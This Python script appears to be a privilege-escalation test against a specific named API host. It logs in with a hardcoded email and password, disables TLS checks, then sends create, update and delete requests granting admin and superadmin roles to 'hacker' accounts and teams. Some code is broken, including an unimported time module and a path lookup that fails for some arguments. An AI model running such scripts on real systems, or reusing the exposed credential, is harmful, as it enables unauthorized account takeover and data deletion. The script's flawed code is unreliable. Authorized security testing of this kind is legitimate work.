#!/usr/bin/env python3
# PHASE 2: CRUD OPERATIONS (Teams/Users from poc_cosgrid.py) [file:147]
import requests
import sys
import urllib3
urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════════════════
# 🔧 CONFIG - EDIT HERE
base_url = "https://poc.cosgridnetworks.in:444/api/v1"
username = "cosgrid@gmail.com"
password = "Mano@321"
tenant_id = 12
# ═══════════════════════════════════════════════════════════════════════════════

if len(sys.argv) < 2:
    print("Usage: python3 phase2.py teams | users | userlist2")
    sys.exit(1)

target = sys.argv[1]
s = requests.Session()
resp = s.post(f"{base_url}/auth/login/", json={"username": username, "password": password}, verify=False)
s.headers["Authorization"] = f"Bearer {resp.json()['token']}"

print(f"🔥 PHASE 2: CRUD OPERATIONS - {target.upper()}")
print("═" * 80)

# Payloads from your poc_cosgrid.py [file:147]
if target in ["teams", "team"]:
    payloads = {
        "CREATE": {"tenantId": tenant_id, "teamName": f"GUEST-HACK-TEAM-{int(time.time())}", "isAdmin": True, "role": "owner"},
        "UPDATE": {"teamName": "HACKED-BY-GUEST", "isAdmin": True},
        "DELETE": None
    }
elif target in ["users", "user"]:
    payloads = {
        "CREATE": {"username": "guest-evil@test.com", "email": "guest-evil@test.com", "active": True, "role": "admin"},
        "UPDATE": {"role": "superadmin", "isadmin": True, "active": True},
        "DELETE": None
    }
else:  # userlist2, generic
    payloads = {
        "CREATE": {"username": "hacker", "role": "admin"},
        "UPDATE": {"isadmin": True},
        "DELETE": None
    }

path_map = {
    "teams": "tenant/data/teams/",
    "users": "tenant/data/users/",
    "userlist2": "tenant/data/userlist2/",
    "useradd": "tenant/data/useradd/"
}[target.split("/")[0]]

for operation, payload in payloads.items():
    url = f"{base_url}/{path_map}"
    if operation == "DELETE":
        resp = s.delete(url, params={"tenant_id": tenant_id}, verify=False)
    else:
        resp = s.request("POST" if "CREATE" in operation else "PUT", 
                        url, json=payload, params={"tenant_id": tenant_id}, verify=False)
    
    result = "🚨 VULNERABLE" if resp.status_code < 400 else f"✅ BLOCKED ({resp.status_code})"
    preview = resp.text[:80].replace("\n", " ")
    
    print(f"{operation:<10} {resp.status_code:3}  {preview:<60}  {result}")
    print("-" * 80)

print("✅ Phase 2 complete!")
